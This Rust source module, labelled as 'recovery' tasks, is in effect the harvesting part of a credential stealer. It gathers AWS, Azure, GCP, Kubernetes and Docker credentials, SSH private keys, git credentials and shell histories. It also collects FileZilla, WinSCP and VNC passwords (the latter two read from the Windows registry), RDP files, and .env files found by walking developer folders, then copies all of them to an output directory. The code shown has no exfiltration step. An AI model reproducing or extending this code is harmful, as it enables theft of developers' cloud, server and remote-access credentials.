use crate::recovery::{
    context::RecoveryContext,
    fs::sanitize_label,
    task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
};
use async_trait::async_trait;
use std::env;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tokio::fs;
use tokio::task::JoinSet;
use winreg::{
    RegKey,
    enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE},
};

pub fn devops_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    vec![
        Arc::new(DevOpsRecoveryTask::new(ctx)),
        Arc::new(FtpClientsTask),
        Arc::new(RdpVncTask),
    ]
}

struct DevOpsRecoveryTask {
    specs: Vec<DevOpsSpec>,
}

#[derive(Clone)]
struct DevOpsSpec {
    label: String,
    path: PathBuf,
    is_dir: bool,
    filters: Option<Vec<String>>,
}

impl DevOpsRecoveryTask {
    fn new(ctx: &RecoveryContext) -> Self {
        let home = &ctx.home_dir;
        let appdata = &ctx.roaming_data_dir;
        let mut specs = Vec::new();

        let aws_creds = env::var("AWS_SHARED_CREDENTIALS_FILE")
            .map(PathBuf::from)
            .unwrap_or_else(|_| home.join(".aws").join("credentials"));
        specs.push(DevOpsSpec {
            label: "AWS Credentials".into(),
            path: aws_creds,
            is_dir: false,
            filters: None,
        });

        let aws_config = env::var("AWS_CONFIG_FILE")
            .map(PathBuf::from)
            .unwrap_or_else(|_| home.join(".aws").join("config"));
        specs.push(DevOpsSpec {
            label: "AWS Config".into(),
            path: aws_config,
            is_dir: false,
            filters: None,
        });

        specs.push(DevOpsSpec {
            label: "Azure Profile".into(),
            path: home.join(".azure").join("azureProfile.json"),
            is_dir: false,
            filters: None,
        });
        specs.push(DevOpsSpec {
            label: "Azure Tokens".into(),
            path: home.join(".azure").join("accessTokens.json"),
            is_dir: false,
            filters: None,
        });

        specs.push(DevOpsSpec {
            label: "GCP Credentials".into(),
            path: home.join(".config").join("gcloud").join("credentials.db"),
            is_dir: false,
            filters: None,
        });

        if let Ok(k_config) = env::var("KUBECONFIG") {
            for (i, path) in env::split_paths(&k_config).enumerate() {
                specs.push(DevOpsSpec {
                    label: format!("Kubeconfig (Env {})", i),
                    path,
                    is_dir: false,
                    filters: None,
                });
            }
        } else {
            specs.push(DevOpsSpec {
                label: "Kubeconfig".into(),
                path: home.join(".kube").join("config"),
                is_dir: false,
                filters: None,
            });
        }

        let docker_config = env::var("DOCKER_CONFIG")
            .map(PathBuf::from)
            .map(|p| p.join("config.json"))
            .unwrap_or_else(|_| home.join(".docker").join("config.json"));
        specs.push(DevOpsSpec {
            label: "Docker Config".into(),
            path: docker_config,
            is_dir: false,
            filters: None,
        });

        specs.push(DevOpsSpec {
            label: "SSH Keys".into(),
            path: home.join(".ssh"),
            is_dir: true,
            filters: Some(vec![
                "id_rsa".into(),
                "id_ed25519".into(),
                "id_ecdsa".into(),
                "id_dsa".into(),
                "known_hosts".into(),
                "config".into(),
                "authorized_keys".into(),
            ]),
        });

        specs.push(DevOpsSpec {
            label: "Git Config".into(),
            path: home.join(".gitconfig"),
            is_dir: false,
            filters: None,
        });
        specs.push(DevOpsSpec {
            label: "Git Credentials".into(),
            path: home.join(".git-credentials"),
            is_dir: false,
            filters: None,
        });

        specs.push(DevOpsSpec {
            label: "Terraform RC".into(),
            path: home.join(".terraform.rc"),
            is_dir: false,
            filters: None,
        });

        specs.push(DevOpsSpec {
            label: "Bash History".into(),
            path: home.join(".bash_history"),
            is_dir: false,
            filters: None,
        });
        specs.push(DevOpsSpec {
            label: "Zsh History".into(),
            path: home.join(".zsh_history"),
            is_dir: false,
            filters: None,
        });
        specs.push(DevOpsSpec {
            label: "PowerShell History".into(),
            path: appdata
                .join("Microsoft")
                .join("Windows")
                .join("PowerShell")
                .join("PSReadLine")
                .join("ConsoleHost_history.txt"),
            is_dir: false,
            filters: None,
        });

        specs.push(DevOpsSpec {
            label: "VS Code User".into(),
            path: appdata.join("Code").join("User"),
            is_dir: true,
            filters: Some(vec![
                "settings.json".into(),
                "keybindings.json".into(),
                "globalStorage".into(),
                "snippets".into(),
                "storage.json".into(),
                "sync".into(),
            ]),
        });

        specs.push(DevOpsSpec {
            label: "JetBrains".into(),
            path: appdata.join("JetBrains"),
            is_dir: true,
            filters: Some(vec![
                "options".into(),
                "keymaps".into(),
                "permanent_id".into(),
                "cwp.txt".into(),
                "certificates.xml".into(),
            ]),
        });

        Self { specs }
    }
}

struct FtpClientsTask;

#[async_trait]
impl RecoveryTask for FtpClientsTask {
    fn label(&self) -> String {
        "FTP Clients".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::DevOps
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let dest_root = ctx.output_dir.join("services").join("DevOps").join("FTP");
        fs::create_dir_all(&dest_root).await?;

        // FileZilla
        let fz_dir = ctx.roaming_data_dir.join("FileZilla");
        if fz_dir.exists() {
            let fz_dest = dest_root.join("FileZilla");
            fs::create_dir_all(&fz_dest).await?;
            for file in ["sitemanager.xml", "recentservers.xml", "filezilla.xml"] {
                copy_if_exists(&fz_dir.join(file), &fz_dest.join(file), "FileZilla", &mut artifacts).await;
            }
        }

        // Cyberduck
        let cd_dir = ctx.roaming_data_dir.join("Cyberduck");
        if cd_dir.exists() {
            let _ = crate::recovery::fs::copy_dir_limited(
                &cd_dir.join("Profiles"),
                &dest_root.join("Cyberduck"),
                "Cyberduck",
                &mut artifacts,
                3,
                100,
            )
            .await;
        }

        // WinSCP (Registry)
        let winscp_key = RegKey::predef(HKEY_CURRENT_USER).open_subkey(r"Software\Martin Prikryl\WinSCP 2\Sessions");
        if let Ok(key) = winscp_key {
            let mut buffer = String::new();
            for subkey_name in key.enum_keys().filter_map(Result::ok) {
                if let Ok(subkey) = key.open_subkey(&subkey_name) {
                    let host = subkey.get_value::<String, _>("HostName").unwrap_or_default();
                    let user = subkey.get_value::<String, _>("UserName").unwrap_or_default();
                    let pass = subkey.get_value::<String, _>("Password").unwrap_or_default(); // Encrypted A3
                    if !host.is_empty() {
                         buffer.push_str(&format!("Session: {}\nHost: {}\nUser: {}\nRawPassword: {}\n\n", subkey_name, host, user, pass));
                    }
                }
            }
            if !buffer.is_empty() {
                 let target = dest_root.join("WinSCP_Sessions.txt");
                 if let Ok(_) = fs::write(&target, buffer).await {
                     if let Ok(meta) = fs::metadata(&target).await {
                         artifacts.push(RecoveryArtifact {
                             label: "WinSCP Registry".to_string(),
                             path: target,
                             size_bytes: meta.len(),
                             modified: meta.modified().ok(),
                         });
                     }
                 }
            }
        }
        
        // WinSCP (INI)
        if let Ok(exe_path) = std::env::current_exe() {
             let ini_path = exe_path.with_file_name("WinSCP.ini");
             if ini_path.exists() {
                 copy_if_exists(&ini_path, &dest_root.join("WinSCP.ini"), "WinSCP INI", &mut artifacts).await;
             }
        }

        Ok(artifacts)
    }
}

struct RdpVncTask;

#[async_trait]
impl RecoveryTask for RdpVncTask {
    fn label(&self) -> String {
        "RDP & VNC".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::DevOps
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let dest_root = ctx.output_dir.join("services").join("DevOps").join("RemoteAccess");
        fs::create_dir_all(&dest_root).await?;

        // RDP Files
        let docs = ctx.home_dir.join("Documents");
        if docs.exists() {
             let mut entries = fs::read_dir(&docs).await?;
             while let Some(entry) = entries.next_entry().await? {
                 let path = entry.path();
                 if path.extension().and_then(|s| s.to_str()).map(|s| s.eq_ignore_ascii_case("rdp")).unwrap_or(false) {
                     copy_if_exists(&path, &dest_root.join(path.file_name().unwrap()), "RDP File", &mut artifacts).await;
                 }
             }
        }
        // Hidden Default.rdp
        copy_if_exists(&docs.join("Default.rdp"), &dest_root.join("Default.rdp"), "Default RDP", &mut artifacts).await;
        copy_if_exists(&ctx.home_dir.join("Default.rdp"), &dest_root.join("Home_Default.rdp"), "Home Default RDP", &mut artifacts).await;

        // VNC Registry Dumps
        let mut vnc_buffer = String::new();
        
        // RealVNC
        if let Ok(key) = RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey(r"SOFTWARE\RealVNC\vncserver") {
             if let Ok(pwd) = key.get_raw_value("Password").map(|v| v.bytes) {
                 vnc_buffer.push_str(&format!("RealVNC (HKLM): {:?}\n", pwd));
             }
        }
        
        // TightVNC
        if let Ok(key) = RegKey::predef(HKEY_CURRENT_USER).open_subkey(r"Software\TightVNC\Server") {
             if let Ok(pwd) = key.get_value::<String, _>("Password") {
                 vnc_buffer.push_str(&format!("TightVNC (HKCU): {}\n", pwd));
             }
             if let Ok(pwd) = key.get_value::<String, _>("ControlPassword") {
                 vnc_buffer.push_str(&format!("TightVNC Control (HKCU): {}\n", pwd));
             }
        }
        
        // UltraVNC INI
        let program_files = std::env::var("ProgramFiles").map(PathBuf::from).unwrap_or_else(|_| PathBuf::from(r"C:\Program Files"));
        let uvnc_ini = program_files.join("UltraVNC").join("ultravnc.ini");
        copy_if_exists(&uvnc_ini, &dest_root.join("ultravnc.ini"), "UltraVNC INI", &mut artifacts).await;

        if !vnc_buffer.is_empty() {
             let target = dest_root.join("VNC_Registry.txt");
             if let Ok(_) = fs::write(&target, vnc_buffer).await {
                  if let Ok(meta) = fs::metadata(&target).await {
                      artifacts.push(RecoveryArtifact {
                          label: "VNC Registry".to_string(),
                          path: target,
                          size_bytes: meta.len(),
                          modified: meta.modified().ok(),
                      });
                  }
             }
        }

        Ok(artifacts)
    }
}

async fn copy_if_exists(src: &Path, dst: &Path, label: &str, artifacts: &mut Vec<RecoveryArtifact>) {
    if src.exists() {
        if let Ok(_) = fs::copy(src, dst).await {
            if let Ok(meta) = fs::metadata(dst).await {
                artifacts.push(RecoveryArtifact {
                    label: label.to_string(),
                    path: dst.to_path_buf(),
                    size_bytes: meta.len(),
                    modified: meta.modified().ok(),
                });
            }
        }
    }
}

pub fn devops_extra_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    vec![Arc::new(EnvFileDiscoveryTask::new(ctx))]
}

struct EnvFileDiscoveryTask {
    roots: Vec<PathBuf>,
}

impl EnvFileDiscoveryTask {
    fn new(ctx: &RecoveryContext) -> Self {
        let mut roots = vec![
            ctx.home_dir.join("Desktop"),
            ctx.home_dir.join("Documents"),
            ctx.home_dir.join("Downloads"),
        ];
        // Add common developer source locations
        let source_roots = ["source", "src", "projects", "work", "dev"];
        for root_name in source_roots {
            let path = ctx.home_dir.join(root_name);
            if path.exists() {
                roots.push(path);
            }
        }
        roots.retain(|p| p.exists());
        Self { roots }
    }
}

#[async_trait]
impl RecoveryTask for EnvFileDiscoveryTask {
    fn label(&self) -> String {
        "DevOps: .env Discovery".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Other
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let dest_root = ctx.output_dir.join("services").join("DevOps").join("Discovery");
        let _ = fs::create_dir_all(&dest_root).await;

        use walkdir::WalkDir;
        let mut found_paths = Vec::new();

        for root in &self.roots {
            let walker = WalkDir::new(root)
                .max_depth(5)
                .follow_links(false)
                .into_iter()
                .filter_entry(|e| {
                    let name = e.file_name().to_string_lossy();
                    !name.starts_with('.') || name == ".env"
                });

            for entry in walker.filter_map(Result::ok) {
                if !entry.file_type().is_file() {
                    continue;
                }
                let name = entry.file_name().to_string_lossy();
                if name == ".env" || name.starts_with(".env.") || name.ends_with(".env") {
                    if entry.metadata().map(|m| m.len()).unwrap_or(0) < 1024 * 256 {
                        found_paths.push(entry.path().to_path_buf());
                    }
                }
            }
        }

        for path in found_paths {
            let rel_label = path.strip_prefix(&ctx.home_dir)
                .map(|p| p.display().to_string().replace('\\', "_"))
                .unwrap_or_else(|_| path.file_name().unwrap().to_string_lossy().to_string());
            
            let target = dest_root.join(format!("{}.txt", rel_label));
            if let Ok(_) = fs::copy(&path, &target).await {
                 if let Ok(meta) = fs::metadata(&target).await {
                    artifacts.push(RecoveryArtifact {
                        label: ".env File".to_string(),
                        path: target,
                        size_bytes: meta.len(),
                        modified: meta.modified().ok(),
                    });
                 }
            }
        }

        Ok(artifacts)
    }
}

#[async_trait]
impl RecoveryTask for DevOpsRecoveryTask {
    fn label(&self) -> String {
        "Cloud & DevOps Credentials".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Other
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let base_dest = ctx.output_dir.join("services").join("DevOps");
        fs::create_dir_all(&base_dest).await?;

        let mut set = JoinSet::new();

        for spec in &self.specs {
            let spec = spec.clone();
            let dest_root = base_dest.clone();

            set.spawn(async move {
                if !spec.path.exists() {
                    return Vec::new();
                }

                let mut task_artifacts = Vec::new();
                let dest = dest_root.join(sanitize_label(&spec.label));

                if spec.is_dir {
                    if let Some(filters) = spec.filters {
                        for filter in filters {
                            let source = spec.path.join(&filter);
                            if !source.exists() {
                                continue;
                            }
                            let target = dest.join(&filter);
                            let meta = match fs::metadata(&source).await {
                                Ok(m) => m,
                                Err(_) => continue,
                            };

                            if meta.is_dir() {
                                let _ = crate::recovery::fs::copy_dir_limited(
                                    &source,
                                    &target,
                                    &spec.label,
                                    &mut task_artifacts,
                                    10,  // depth
                                    100, // limit
                                )
                                .await;
                            } else {
                                let _ = fs::create_dir_all(&target.parent().unwrap()).await;
                                if let Ok(_) = fs::copy(&source, &target).await {
                                    task_artifacts.push(RecoveryArtifact {
                                        label: spec.label.clone(),
                                        path: target,
                                        size_bytes: meta.len(),
                                        modified: meta.modified().ok(),
                                    });
                                }
                            }
                        }
                    } else {
                        let _ = crate::recovery::fs::copy_dir_limited(
                            &spec.path,
                            &dest,
                            &spec.label,
                            &mut task_artifacts,
                            5,
                            500,
                        )
                        .await;
                    }
                } else {
                    if let Ok(meta) = fs::metadata(&spec.path).await {
                        if meta.is_file() {
                            let _ = fs::create_dir_all(&dest).await;
                            let file_name = spec
                                .path
                                .file_name()
                                .unwrap_or_else(|| std::ffi::OsStr::new("file"));
                            let target_path = dest.join(file_name);
                            if let Ok(_) = fs::copy(&spec.path, &target_path).await {
                                task_artifacts.push(RecoveryArtifact {
                                    label: spec.label,
                                    path: target_path,
                                    size_bytes: meta.len(),
                                    modified: meta.modified().ok(),
                                });
                            }
                        }
                    }
                }
                task_artifacts
            });
        }

        while let Some(res) = set.join_next().await {
            if let Ok(mut items) = res {
                artifacts.append(&mut items);
            }
        }

        Ok(artifacts)
    }
}
